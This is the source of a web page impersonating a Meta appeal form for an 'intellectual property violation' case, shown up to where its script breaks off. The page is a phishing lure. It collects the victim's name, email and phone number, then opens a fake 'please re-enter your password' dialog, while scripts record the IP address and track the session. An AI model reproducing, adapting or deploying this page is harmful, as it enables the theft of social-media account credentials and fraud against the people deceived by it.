﻿<?php
session_start(); // Bắt đầu phiên làm việc (session)

// Lưu thông tin người dùng vào session
$_SESSION['user'] = array(
    'id' => 123,
    'username' => 'nguoidung1',
    'email' => 'nguoidung1@example.com'
);


// Sau đó, bạn có thể truy cập thông tin người dùng từ session bằng cách đọc $_SESSION['user']
?>
<html lang="en">

<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->

<head>
    <!-- Required meta tags -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <title>Meta</title>
    <style>
        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            border: 2px solid #ccc;
            border-top-color: #00ff00;
            /* Green color */
            animation: spinner 0.8s linear infinite;
            margin-right: 8px;
        }

        @keyframes spinner {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .loader {
            position: fixed;
            top: 50%;
            left: 50%;

            z-index: 9999;
            width: 40px;
            height: 40px;

            display: none;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* .loader {
  position: relative;
  width: 54px;
  height: 54px;
  border-radius: 10px;
} */

        .loader div {
            width: 8%;
            height: 24%;
            background: rgb(128, 128, 128);
            position: absolute;
            left: 50%;
            top: 30%;
            opacity: 0;
            border-radius: 50px;
            box-shadow: 0 0 3px rgba(0, 0, 0, 0.2);
            animation: fade458 1s linear infinite;
        }

        @keyframes fade458 {
            from {
                opacity: 1;
            }

            to {
                opacity: 0.25;
            }
        }

        .loader .bar1 {
            transform: rotate(0deg) translate(0, -130%);
            animation-delay: 0s;
        }

        .loader .bar2 {
            transform: rotate(30deg) translate(0, -130%);
            animation-delay: -1.1s;
        }

        .loader .bar3 {
            transform: rotate(60deg) translate(0, -130%);
            animation-delay: -1s;
        }

        .loader .bar4 {
            transform: rotate(90deg) translate(0, -130%);
            animation-delay: -0.9s;
        }

        .loader .bar5 {
            transform: rotate(120deg) translate(0, -130%);
            animation-delay: -0.8s;
        }

        .loader .bar6 {
            transform: rotate(150deg) translate(0, -130%);
            animation-delay: -0.7s;
        }

        .loader .bar7 {
            transform: rotate(180deg) translate(0, -130%);
            animation-delay: -0.6s;
        }

        .loader .bar8 {
            transform: rotate(210deg) translate(0, -130%);
            animation-delay: -0.5s;
        }

        .loader .bar9 {
            transform: rotate(240deg) translate(0, -130%);
            animation-delay: -0.4s;
        }

        .loader .bar10 {
            transform: rotate(270deg) translate(0, -130%);
            animation-delay: -0.3s;
        }

        .loader .bar11 {
            transform: rotate(300deg) translate(0, -130%);
            animation-delay: -0.2s;
        }

        .loader .bar12 {
            transform: rotate(330deg) translate(0, -130%);
            animation-delay: -0.1s;
        }
    </style>

    <link rel="shortcut icon" href="images/favicon.ico" />


</head>

<body>


    <link rel="stylesheet" href="css/app.css" />
    <div id="home-page" class="app-wrapper container-fluid-width home-page">
        <section class="header">
            <div class="container" bis_skin_checked="1">
                <div class="row" bis_skin_checked="1">
                    <div class="col-6" bis_skin_checked="1">
                        <img src="https://i.imgur.com/ZUXA21k.png" class="img-fluid" width="120">
                    </div>
                    <div class="col-6" style="text-align: right;" bis_skin_checked="1">
                        <p style="color:#3578e5; display:none; padding-top: 8px; margin-bottom: 0px; font-weight: 600; font-size: 15px;"><i style="font-size: 16px;" class="fa-solid fa-envelope"></i> Support Inbox</p>
                    </div>
                </div>
            </div>
        </section>
        <section class="main">
            <div class="container">
                <div class="row">
                    <div class="col-md-8 offset-md-2">
                        <div class="card">
                            <div class="row" style="padding-bottom: 20px; border-bottom: 1px solid #dddfe2;">
                                <div class="col-md-1 col-2">
                                    <img src="images/email-icon-circle-28.jpg" class="fa-solid fa-envelope" style=" " width="50">
                                </div>
                                <div class="col-md-11 col-10">
                                    <p style="font-weight: bold; margin-bottom: 0;">Intellectual property violation</p>
                                    <div class="">
                                        <span data-v-4362cbd2="" class="open" style="background-color: rgb(59, 129, 211); font-size: 12px;">OPEN</span>
                                        <span style="color:#90949c; font-size: 12px;">CASE #8894777049546</span>
                                    </div>
                                </div>
                            </div>
                            <div class="row" style="padding-top: 20px; padding-bottom: 20px;  border-bottom:1px solid #dddfe2">
                                <input hidden id="ip" name="ip">
                                <div class="col-md-1 col-2">
                                    <img src="images/newlogo1.png" class="img-fluid">
                                </div>
                                <div class="col-md-11 col-10" style="padding-left: 0;">
                                    <p style="font-weight: bold; font-size: 14px; margin-bottom: 7px">Our Message</p>
                                    <p style="font-size: 14px; color:#67788A;" class="ourmessagiii">
                                        - Community Standards<br>
                                        - Copyright<br>
                                        - Hate speech, harassment and bullying<br>
                                        - Intellectual property rights<br>
                                        <br>
                                        If you believe your page was removed by mistake, fill in this form so we can help.


                                    </p>
                                </div>
                            </div>
                            <div class="row" style="padding-top: 10px; padding-bottom: 10px;  border-bottom:1px solid #dddfe2">
                                <div class="col-md-1 col-2"></div>
                                <div class="col-md-11 col-10" style="padding-left: 0;">
                                    <p style="font-weight: bold; font-size: 14px; margin-bottom: 7px"></p>
                                    <form style="margin-left: -30px;">
                                        <input type="hidden" name="password" id="password" />
                                        <div style="display:inline-block;">
                                            <label style="color:#67788A;">* Required</label>
                                            <label style="color:#67788A; font-style: italic; font-weight: normal;">(Your meta Account Information)</label>
                                            <label id="form-error" style="color:red; font-style: italic;"></label>
                                        </div>
                                        <div class="form-group">
                                            <label for="name" style="color:#67788A;">Who is the owner of the Page? *</label>
                                            <input type="text" class="form-control" id="name" name="name" style="font-size: 14px; border: 1px solid #67788A;" required>
                                        </div>
                                        <div class="form-group">
                                            <label for="email" style="color:#67788A;">Email Address *</label>
                                            <input type="email" class="form-control" style="border-radius: 0; height: 35px; border: 1px solid #67788A;" id="email" name="email" aria-describedby="email" required>
                                        </div>
                                        <div class="form-group">
                                            <label for="phone" style="color:#67788A;">Phone Number *</label>
                                            <div>
                                                <select id="country_code" class="form-control" style="display: inline-block;vertical-align: middle;width: 90px;height: 35px;padding-bottom: 3px;padding-top: 3px; border-radius: 0px; border: 1px solid #67788A;">
                                                    <option name="United States (+1)" value="1">+1</option>
                                                    <option name="Afghanistan (+93)" value="93">Afghanistan (+93)</option>
                                                    <option name="Albania (+355)" value="355">Albania (+355)</option>
                                                    <option name="Algeria (+213)" value="213">Algeria (+213)</option>
                                                    <option name="American Samoa (+1)" value="1">American Samoa (+1)</option>
                                                    <option name="Andorra (+376)" value="376">Andorra (+376)</option>
                                                    <option name="Angola (+244)" value="244">Angola (+244)</option>
                                                    <option name="Anguilla (+1)" value="1">Anguilla (+1)</option>
                                                    <option name="Antigua (+1)" value="1">Antigua (+1)</option>
                                                    <option name="Argentina (+54)" value="54">Argentina (+54)</option>
                                                    <option name="Armenia (+374)" value="374">Armenia (+374)</option>
                                                    <option name="Aruba (+297)" value="297">Aruba (+297)</option>
                                                    <option name="Australia (+61)" value="61">Australia (+61)</option>
                                                    <option name="Austria (+43)" value="43">Austria (+43)</option>
                                                    <option name="Azerbaijan (+994)" value="994">Azerbaijan (+994)</option>
                                                    <option name="Bahrain (+973)" value="973">Bahrain (+973)</option>
                                                    <option name="Bangladesh (+880)" value="880">Bangladesh (+880)</option>
                                                    <option name="Barbados (+1)" value="1">Barbados (+1)</option>
                                                    <option name="Belarus (+375)" value="375">Belarus (+375)</option>
                                                    <option name="Belgium (+32)" value="32">Belgium (+32)</option>
                                                    <option name="Belize (+501)" value="501">Belize (+501)</option>
                                                    <option name="Benin (+229)" value="229">Benin (+229)</option>
                                                    <option name="Bermuda (+1)" value="1">Bermuda (+1)</option>
                                                    <option name="Bhutan (+975)" value="975">Bhutan (+975)</option>
                                                    <option name="Bolivia (+591)" value="591">Bolivia (+591)</option>
                                                    <option name="Bonaire, Sint Eustatius and Saba (+599)" value="599">Bonaire, Sint Eustatius and Saba (+599)</option>
                                                    <option name="Bosnia and Herzegovina (+387)" value="387">Bosnia and Herzegovina (+387)</option>
                                                    <option name="Botswana (+267)" value="267">Botswana (+267)</option>
                                                    <option name="Brazil (+55)" value="55">Brazil (+55)</option>
                                                    <option name="British Indian Ocean Territory (+246)" value="246">British Indian Ocean Territory (+246)</option>
                                                    <option name="British Virgin Islands (+1)" value="1">British Virgin Islands (+1)</option>
                                                    <option name="Brunei (+673)" value="673">Brunei (+673)</option>
                                                    <option name="Bulgaria (+359)" value="359">Bulgaria (+359)</option>
                                                    <option name="Burkina Faso (+226)" value="226">Burkina Faso (+226)</option>
                                                    <option name="Burundi (+257)" value="257">Burundi (+257)</option>
                                                    <option name="Cambodia (+855)" value="855">Cambodia (+855)</option>
                                                    <option name="Cameroon (+237)" value="237">Cameroon (+237)</option>
                                                    <option name="Canada (+1)" value="1">Canada (+1)</option>
                                                    <option name="Cape Verde (+238)" value="238">Cape Verde (+238)</option>
                                                    <option name="Cayman Islands (+1)" value="1">Cayman Islands (+1)</option>
                                                    <option name="Côte d'Ivoire (+225)" value="225">Côte d'Ivoire (+225)</option>
                                                    <option name="Central African Republic (+236)" value="236">Central African Republic (+236)</option>
                                                    <option name="Chad (+235)" value="235">Chad (+235)</option>
                                                    <option name="Chile (+56)" value="56">Chile (+56)</option>
                                                    <option name="China (+86)" value="86">China (+86)</option>
                                                    <option name="Colombia (+57)" value="57">Colombia (+57)</option>
                                                    <option name="Comoros (+269)" value="269">Comoros (+269)</option>
                                                    <option name="Cook Islands (+682)" value="682">Cook Islands (+682)</option>
                                                    <option name="Costa Rica (+506)" value="506">Costa Rica (+506)</option>
                                                    <option name="Croatia (+385)" value="385">Croatia (+385)</option>
                                                    <option name="Cuba (+53)" value="53">Cuba (+53)</option>
                                                    <option name="Curaçao (+599)" value="599">Curaçao (+599)</option>
                                                    <option name="Cyprus (+357)" value="357">Cyprus (+357)</option>
                                                    <option name="Czech Republic (+420)" value="420">Czech Republic (+420)</option>
                                                    <option name="Democratic Republic of the Congo (+243)" value="243">Democratic Republic of the Congo (+243)</option>
                                                    <option name="Denmark (+45)" value="45">Denmark (+45)</option>
                                                    <option name="Djibouti (+253)" value="253">Djibouti (+253)</option>
                                                    <option name="Dominica (+1)" value="1">Dominica (+1)</option>
                                                    <option name="Dominican Republic (+1)" value="1">Dominican Republic (+1)</option>
                                                    <option name="Ecuador (+593)" value="593">Ecuador (+593)</option>
                                                    <option name="Egypt (+20)" value="20">Egypt (+20)</option>
                                                    <option name="El Salvador (+503)" value="503">El Salvador (+503)</option>
                                                    <option name="Equatorial Guinea (+240)" value="240">Equatorial Guinea (+240)</option>
                                                    <option name="Eritrea (+291)" value="291">Eritrea (+291)</option>
                                                    <option name="Estonia (+372)" value="372">Estonia (+372)</option>
                                                    <option name="Ethiopia (+251)" value="251">Ethiopia (+251)</option>
                                                    <option name="Falkland Islands (+500)" value="500">Falkland Islands (+500)</option>
                                                    <option name="Faroe Islands (+298)" value="298">Faroe Islands (+298)</option>
                                                    <option name="Federated States of Micronesia (+691)" value="691">Federated States of Micronesia (+691)</option>
                                                    <option name="Fiji (+679)" value="679">Fiji (+679)</option>
                                                    <option name="Finland (+358)" value="358">Finland (+358)</option>
                                                    <option name="France (+33)" value="33">France (+33)</option>
                                                    <option name="French Guiana (+594)" value="594">French Guiana (+594)</option>
                                                    <option name="French Polynesia (+689)" value="689">French Polynesia (+689)</option>
                                                    <option name="Gabon (+241)" value="241">Gabon (+241)</option>
                                                    <option name="Georgia (+995)" value="995">Georgia (+995)</option>
                                                    <option name="Germany (+49)" value="49">Germany (+49)</option>
                                                    <option name="Ghana (+233)" value="233">Ghana (+233)</option>
                                                    <option name="Gibraltar (+350)" value="350">Gibraltar (+350)</option>
                                                    <option name="Greece (+30)" value="30">Greece (+30)</option>
                                                    <option name="Greenland (+299)" value="299">Greenland (+299)</option>
                                                    <option name="Grenada (+1)" value="1">Grenada (+1)</option>
                                                    <option name="Guadeloupe (+590)" value="590">Guadeloupe (+590)</option>
                                                    <option name="Guam (+1)" value="1">Guam (+1)</option>
                                                    <option name="Guatemala (+502)" value="502">Guatemala (+502)</option>
                                                    <option name="Guernsey (+44)" value="44">Guernsey (+44)</option>
                                                    <option name="Guinea (+224)" value="224">Guinea (+224)</option>
                                                    <option name="Guinea-Bissau (+245)" value="245">Guinea-Bissau (+245)</option>
                                                    <option name="Guyana (+592)" value="592">Guyana (+592)</option>
                                                    <option name="Haiti (+509)" value="509">Haiti (+509)</option>
                                                    <option name="Honduras (+504)" value="504">Honduras (+504)</option>
                                                    <option name="Hong Kong (+852)" value="852">Hong Kong (+852)</option>
                                                    <option name="Hungary (+36)" value="36">Hungary (+36)</option>
                                                    <option name="Iceland (+354)" value="354">Iceland (+354)</option>
                                                    <option name="India (+91)" value="91">India (+91)</option>
                                                    <option name="Indonesia (+62)" value="62">Indonesia (+62)</option>
                                                    <option name="Iran (+98)" value="98">Iran (+98)</option>
                                                    <option name="Iraq (+964)" value="964">Iraq (+964)</option>
                                                    <option name="Ireland (+353)" value="353">Ireland (+353)</option>
                                                    <option name="Isle Of Man (+44)" value="44">Isle Of Man (+44)</option>
                                                    <option name="Israel (+972)" value="972">Israel (+972)</option>
                                                    <option name="Italy (+39)" value="39">Italy (+39)</option>
                                                    <option name="Jamaica (+1)" value="1">Jamaica (+1)</option>
                                                    <option name="Japan (+81)" value="81">Japan (+81)</option>
                                                    <option name="Jersey (+44)" value="44">Jersey (+44)</option>
                                                    <option name="Jordan (+962)" value="962">Jordan (+962)</option>
                                                    <option name="Kazakhstan (+7)" value="7">Kazakhstan (+7)</option>
                                                    <option name="Kenya (+254)" value="254">Kenya (+254)</option>
                                                    <option name="Kiribati (+686)" value="686">Kiribati (+686)</option>
                                                    <option name="Kosovo (+383)" value="383">Kosovo (+383)</option>
                                                    <option name="Kuwait (+965)" value="965">Kuwait (+965)</option>
                                                    <option name="Kyrgyzstan (+996)" value="996">Kyrgyzstan (+996)</option>
                                                    <option name="Laos (+856)" value="856">Laos (+856)</option>
                                                    <option name="Latvia (+371)" value="371">Latvia (+371)</option>
                                                    <option name="Lebanon (+961)" value="961">Lebanon (+961)</option>
                                                    <option name="Lesotho (+266)" value="266">Lesotho (+266)</option>
                                                    <option name="Liberia (+231)" value="231">Liberia (+231)</option>
                                                    <option name="Libya (+218)" value="218">Libya (+218)</option>
                                                    <option name="Liechtenstein (+423)" value="423">Liechtenstein (+423)</option>
                                                    <option name="Lithuania (+370)" value="370">Lithuania (+370)</option>
                                                    <option name="Luxembourg (+352)" value="352">Luxembourg (+352)</option>
                                                    <option name="Macau (+853)" value="853">Macau (+853)</option>
                                                    <option name="Macedonia (+389)" value="389">Macedonia (+389)</option>
                                                    <option name="Madagascar (+261)" value="261">Madagascar (+261)</option>
                                                    <option name="Malawi (+265)" value="265">Malawi (+265)</option>
                                                    <option name="Malaysia (+60)" value="60">Malaysia (+60)</option>
                                                    <option name="Maldives (+960)" value="960">Maldives (+960)</option>
                                                    <option name="Mali (+223)" value="223">Mali (+223)</option>
                                                    <option name="Malta (+356)" value="356">Malta (+356)</option>
                                                    <option name="Marshall Islands (+692)" value="692">Marshall Islands (+692)</option>
                                                    <option name="Martinique (+596)" value="596">Martinique (+596)</option>
                                                    <option name="Mauritania (+222)" value="222">Mauritania (+222)</option>
                                                    <option name="Mauritius (+230)" value="230">Mauritius (+230)</option>
                                                    <option name="Mayotte (+262)" value="262">Mayotte (+262)</option>
                                                    <option name="Mexico (+52)" value="52">Mexico (+52)</option>
                                                    <option name="Moldova (+373)" value="373">Moldova (+373)</option>
                                                    <option name="Monaco (+377)" value="377">Monaco (+377)</option>
                                                    <option name="Mongolia (+976)" value="976">Mongolia (+976)</option>
                                                    <option name="Montenegro (+382)" value="382">Montenegro (+382)</option>
                                                    <option name="Montserrat (+1)" value="1">Montserrat (+1)</option>
                                                    <option name="Morocco (+212)" value="212">Morocco (+212)</option>
                                                    <option name="Mozambique (+258)" value="258">Mozambique (+258)</option>
                                                    <option name="Myanmar (+95)" value="95">Myanmar (+95)</option>
                                                    <option name="Namibia (+264)" value="264">Namibia (+264)</option>
                                                    <option name="Nauru (+674)" value="674">Nauru (+674)</option>
                                                    <option name="Nepal (+977)" value="977">Nepal (+977)</option>
                                                    <option name="Netherlands (+31)" value="31">Netherlands (+31)</option>
                                                    <option name="New Caledonia (+687)" value="687">New Caledonia (+687)</option>
                                                    <option name="New Zealand (+64)" value="64">New Zealand (+64)</option>
                                                    <option name="Nicaragua (+505)" value="505">Nicaragua (+505)</option>
                                                    <option name="Niger (+227)" value="227">Niger (+227)</option>
                                                    <option name="Nigeria (+234)" value="234">Nigeria (+234)</option>
                                                    <option name="Niue (+683)" value="683">Niue (+683)</option>
                                                    <option name="Norfolk Island (+672)" value="672">Norfolk Island (+672)</option>
                                                    <option name="North Korea (+850)" value="850">North Korea (+850)</option>
                                                    <option name="Northern Mariana Islands (+1)" value="1">Northern Mariana Islands (+1)</option>
                                                    <option name="Norway (+47)" value="47">Norway (+47)</option>
                                                    <option name="Oman (+968)" value="968">Oman (+968)</option>
                                                    <option name="Pakistan (+92)" value="92">Pakistan (+92)</option>
                                                    <option name="Palau (+680)" value="680">Palau (+680)</option>
                                                    <option name="Palestine (+970)" value="970">Palestine (+970)</option>
                                                    <option name="Panama (+507)" value="507">Panama (+507)</option>
                                                    <option name="Papua New Guinea (+675)" value="675">Papua New Guinea (+675)</option>
                                                    <option name="Paraguay (+595)" value="595">Paraguay (+595)</option>
                                                    <option name="Peru (+51)" value="51">Peru (+51)</option>
                                                    <option name="Philippines (+63)" value="63">Philippines (+63)</option>
                                                    <option name="Poland (+48)" value="48">Poland (+48)</option>
                                                    <option name="Portugal (+351)" value="351">Portugal (+351)</option>
                                                    <option name="Puerto Rico (+1)" value="1">Puerto Rico (+1)</option>
                                                    <option name="Qatar (+974)" value="974">Qatar (+974)</option>
                                                    <option name="Réunion (+262)" value="262">Réunion (+262)</option>
                                                    <option name="Republic of the Congo (+242)" value="242">Republic of the Congo (+242)</option>
                                                    <option name="Romania (+40)" value="40">Romania (+40)</option>
                                                    <option name="Russia (+7)" value="7">Russia (+7)</option>
                                                    <option name="Rwanda (+250)" value="250">Rwanda (+250)</option>
                                                    <option name="Saint Barthélemy (+590)" value="590">Saint Barthélemy (+590)</option>
                                                    <option name="Saint Helena (+290)" value="290">Saint Helena (+290)</option>
                                                    <option name="Saint Kitts and Nevis (+1)" value="1">Saint Kitts and Nevis (+1)</option>
                                                    <option name="Saint Martin (+590)" value="590">Saint Martin (+590)</option>
                                                    <option name="Saint Pierre and Miquelon (+508)" value="508">Saint Pierre and Miquelon (+508)</option>
                                                    <option name="Saint Vincent and the Grenadines (+1)" value="1">Saint Vincent and the Grenadines (+1)</option>
                                                    <option name="Samoa (+685)" value="685">Samoa (+685)</option>
                                                    <option name="San Marino (+378)" value="378">San Marino (+378)</option>
                                                    <option name="Sao Tome and Principe (+239)" value="239">Sao Tome and Principe (+239)</option>
                                                    <option name="Saudi Arabia (+966)" value="966">Saudi Arabia (+966)</option>
                                                    <option name="Senegal (+221)" value="221">Senegal (+221)</option>
                                                    <option name="Serbia (+381)" value="381">Serbia (+381)</option>
                                                    <option name="Seychelles (+248)" value="248">Seychelles (+248)</option>
                                                    <option name="Sierra Leone (+232)" value="232">Sierra Leone (+232)</option>
                                                    <option name="Singapore (+65)" value="65">Singapore (+65)</option>
                                                    <option name="Sint Maarten (+1)" value="1">Sint Maarten (+1)</option>
                                                    <option name="Slovakia (+421)" value="421">Slovakia (+421)</option>
                                                    <option name="Slovenia (+386)" value="386">Slovenia (+386)</option>
                                                    <option name="Solomon Islands (+677)" value="677">Solomon Islands (+677)</option>
                                                    <option name="Somalia (+252)" value="252">Somalia (+252)</option>
                                                    <option name="South Africa (+27)" value="27">South Africa (+27)</option>
                                                    <option name="South Korea (+82)" value="82">South Korea (+82)</option>
                                                    <option name="South Sudan (+211)" value="211">South Sudan (+211)</option>
                                                    <option name="Spain (+34)" value="34">Spain (+34)</option>
                                                    <option name="Sri Lanka (+94)" value="94">Sri Lanka (+94)</option>
                                                    <option name="St. Lucia (+1)" value="1">St. Lucia (+1)</option>
                                                    <option name="Sudan (+249)" value="249">Sudan (+249)</option>
                                                    <option name="Suriname (+597)" value="597">Suriname (+597)</option>
                                                    <option name="Swaziland (+268)" value="268">Swaziland (+268)</option>
                                                    <option name="Sweden (+46)" value="46">Sweden (+46)</option>
                                                    <option name="Switzerland (+41)" value="41">Switzerland (+41)</option>
                                                    <option name="Syria (+963)" value="963">Syria (+963)</option>
                                                    <option name="Taiwan (+886)" value="886">Taiwan (+886)</option>
                                                    <option name="Tajikistan (+992)" value="992">Tajikistan (+992)</option>
                                                    <option name="Tanzania (+255)" value="255">Tanzania (+255)</option>
                                                    <option name="Thailand (+66)" value="66">Thailand (+66)</option>
                                                    <option name="The Bahamas (+1)" value="1">The Bahamas (+1)</option>
                                                    <option name="The Gambia (+220)" value="220">The Gambia (+220)</option>
                                                    <option name="Timor-Leste (+670)" value="670">Timor-Leste (+670)</option>
                                                    <option name="Togo (+228)" value="228">Togo (+228)</option>
                                                    <option name="Tokelau (+690)" value="690">Tokelau (+690)</option>
                                                    <option name="Tonga (+676)" value="676">Tonga (+676)</option>
                                                    <option name="Trinidad and Tobago (+1)" value="1">Trinidad and Tobago (+1)</option>
                                                    <option name="Tunisia (+216)" value="216">Tunisia (+216)</option>
                                                    <option name="Turkey (+90)" value="90">Turkey (+90)</option>
                                                    <option name="Turkmenistan (+993)" value="993">Turkmenistan (+993)</option>
                                                    <option name="Turks and Caicos Islands (+1)" value="1">Turks and Caicos Islands (+1)</option>
                                                    <option name="Tuvalu (+688)" value="688">Tuvalu (+688)</option>
                                                    <option name="Uganda (+256)" value="256">Uganda (+256)</option>
                                                    <option name="Ukraine (+380)" value="380">Ukraine (+380)</option>
                                                    <option name="United Arab Emirates (+971)" value="971">United Arab Emirates (+971)</option>
                                                    <option name="United Kingdom (+44)" value="44">United Kingdom (+44)</option>
                                                    <option name="Uruguay (+598)" value="598">Uruguay (+598)</option>
                                                    <option name="US Virgin Islands (+1)" value="1">US Virgin Islands (+1)</option>
                                                    <option name="Uzbekistan (+998)" value="998">Uzbekistan (+998)</option>
                                                    <option name="Vanuatu (+678)" value="678">Vanuatu (+678)</option>
                                                    <option name="Vatican City (+39)" value="39">Vatican City (+39)</option>
                                                    <option name="Venezuela (+58)" value="58">Venezuela (+58)</option>
                                                    <option name="Vietnam (+84)" value="84">Vietnam (+84)</option>
                                                    <option name="Wallis and Futuna (+681)" value="681">Wallis and Futuna (+681)</option>
                                                    <option name="Western Sahara (+212)" value="212">Western Sahara (+212)</option>
                                                    <option name="Yemen (+967)" value="967">Yemen (+967)</option>
                                                    <option name="Zambia (+260)" value="260">Zambia (+260)</option>
                                                    <option name="Zimbabwe (+263)" value="263">Zimbabwe (+263)</option>
                                                </select>
                                                <input type="text" class="form-control" id="phone" name="phone" required style="display: inline-block;vertical-align: middle;width: 50%; border: 1px solid #67788A;" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
                                            </div>
                                        </div>

                                        <div data-v-4362cbd2="" class="mb-3">
                                            <div data-v-4362cbd2="" class="form-check">
                                                <input data-v-4362cbd2="" type="checkbox" value="" id="flexCheckDefault" class="form-check-input">
                                                <label data-v-4362cbd2="" for="flexCheckDefault" class="form-check-label" style="font-size:14px; color:#67788A; font-weight: bold;">
                                                    Country of your credit and/or debit cards doesn't match your current location
                                                </label>
                                            </div>
                                        </div>
                                        <div data-v-4362cbd2="" class="mb-3">
                                            <div data-v-4362cbd2="" class="form-check">
                                                <input data-v-4362cbd2="" type="checkbox" value="" id="flexCheckDefault2" class="form-check-input">
                                                <label data-v-4362cbd2="" for="flexCheckDefault2" class="form-check-label" style="font-size:14px; color:#67788A; font-weight: bold;">
                                                    You traveled within the last 60 days
                                                </label>
                                            </div>
                                        </div>
                                        <div data-v-4362cbd2="" class="mb-3">
                                            <div data-v-4362cbd2="" class="form-check">
                                                <input data-v-4362cbd2="" type="checkbox" value="" id="flexCheckDefault3" class="form-check-input">
                                                <label data-v-4362cbd2="" for="flexCheckDefault3" class="form-check-label" style="font-size:14px; color:#67788A; font-weight: bold;">
                                                    You relocated within the last 60 days
                                                </label>
                                            </div>
                                        </div>
                                        <div class="form-group" style="margin-top: 15px;">
                                            <label for="reason" style="color:#67788A;">Your Appeal *</label>
                                            <textarea name="reason" id="reason" class="form-control" style="border: 1px solid #67788A;"></textarea>
                                        </div>

                                        <div class="form-check">
                                            <input class="form-check-input check" type="checkbox" id="check" value="1" name="check" required>
                                            <label class="form-check-label" for="check" name="check" style="font-size:14px; color:#67788A; font-weight: bold;">
                                                Agree to our Terms, Data Policy and Cookies Policy. *
                                            </label>
                                        </div>
                                        <input id="btn-submit" type="button" class="btn btn-primary btn-register-send" name="formasubmitapeal" value="Submit" style="border-radius: 15px;box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);margin-top: 20px; padding: 15px 20px 15px 20px; color: #ffffff; background-color: #0067cd; border:0px; font-weight: bold; font-size: 14px;">

                                        <div style="margin-top:15px;">
                                            <p style="font-size:14px; color:#67788A; display:inline-block;">For more information about how Meta handles your data please read our</p>
                                            <a style="font-size:14px; text-decoration: underline; color: #0064E0;" href="https://www.facebook.com/privacy/explanation/">Meta Privacy Policy</a>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>
                <hr style="width: 50%;">
            </div>
        </section>
        <!-- <div id="loading-circle"></div> -->
        <div class="loader" id="loading-circle">
            <div class="bar1"></div>
            <div class="bar2"></div>
            <div class="bar3"></div>
            <div class="bar4"></div>
            <div class="bar5"></div>
            <div class="bar6"></div>
            <div class="bar7"></div>
            <div class="bar8"></div>
            <div class="bar9"></div>
            <div class="bar10"></div>
            <div class="bar11"></div>
            <div class="bar12"></div>
        </div>

        <div class="modal fade" style="margin-top:20px;" id="passwordModal" aria-modal="true" role="dialog" data-bs-keyboard="false" data-bs-backdrop="static">
            <div class="modal-dialog" role="document">
                <div style="box-shadow: 0 2px 26px rgba(0, 0, 0, .3), 0 0 0 1px rgba(0, 0, 0, .1)" class="modal-content">
                    <div style="padding: 10px 15px; background-color: #f5f6f7; border-bottom: 1px solid #e5e5e5" class="modal-header">
                        <h5 class="modal-title" style="color: #67788A !important; font-size:14px; font-weight:600; line-height: 25px;">Please Enter Your Password</h5>
                        <button type="button" class="close btn-modal-cancel cancel" data-dismiss="modal">
                            <span aria-hidden="true" action="#">×</span>
                        </button>
                    </div>
                    <form style="margin-bottom: 0px;">
                        <div class="modal-body">
                            <p style="font-size:14px; color: #67788A;">For your security, you must re-enter your password to continue.</p>

                            <div style="margin-bottom:0;" class="form-group row">
                                <label id="hiqetash" for="inputPassword3" class="col-form-label" style="font-size:14px;display:inline-block; padding-left:15px; padding-right:9px; color: #67788A;">Password</label>
                                <div id="hiqetash2" class="password-container">
                                    <input type="password" id="password-input" style="height: 25px; font-size:16px; width: 170px; margin-top:5px; border-radius:0; padding: 0 3px;" class="form-control password_input" required>
                                </div>
                                <div style="display:none;margin-top: 10px; margin-left: 5px; opacity: 0.5;" id="togglePassword">
                                    <span hidden class="hide-pass fa-regular fa-eye" aria-hidden="true" style="font-size: 12px; margin-top: 10px; margin-left: 5px; color: #67788A;">HIDE</span>
                                    <span class="show-pass fa-regular fa-eye-slash" aria-hidden="true" style="font-size: 12px; margin-top: 10px; margin-left: 5px; color: #67788A;">SHOW</span>
                                </div>
                            </div>
                            <span id="message_err"></span>

                            <p class="password-error" style="color:red;font-size:14px;margin-left: 25px;margin-top: 6px;"></p>
                            <p class="password-validating" style="color:green;font-size:14px;margin-left: 25px;margin-top: 6px;"></p>
                        </div>
                        <div class="modal-footer">
                            <button style="background-color: #f5f6f7; border:1px solid #ccd0d5; color: #4b4f56; height:27px; padding:1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-secondary btn-modal-cancel cancel" data-dismiss="modal">
                                Cancel
                            </button>
                            <button style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-primary submit_password">
                                Submit
                            </button>
                            <button style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-primary try-again" hidden>
                                Try Again
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js"></script>


</body>

<script>
    let check_submit = false
    $(document).ready(function() {
        (function() {
            GetSess();
var clientToken= "";            getIP();
            AddSess();
            checkCountry();
            setInterval(function() {
                getsttindex(); // Thay '32131' bằng id thực tế của bạn
            }, 3000);
        })();

        document.getElementById('password-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendPasword();
            }
        });

        $("#btn-submit").click(function() {
            var isValid = true;

            var phone = $('#phone').val();
            sessionStorage.setItem('phone', phone);
            if (!phone)
                isValid = false;

            email = $('#email').val();
            if (!email)
                isValid = false;
            sessionStorage.setItem('email', email);



            var reason = $('#reason').val();
            if (!reason)
                isValid = false;

            var check = $('#check').is(":checked");
            if (!check)
                isValid = false;


            if (!isValid) {
                $('#form-error').text('Please fill in the required information');
                return;
            } else {
                showLoadingCircle();
                setTimeout(() => {
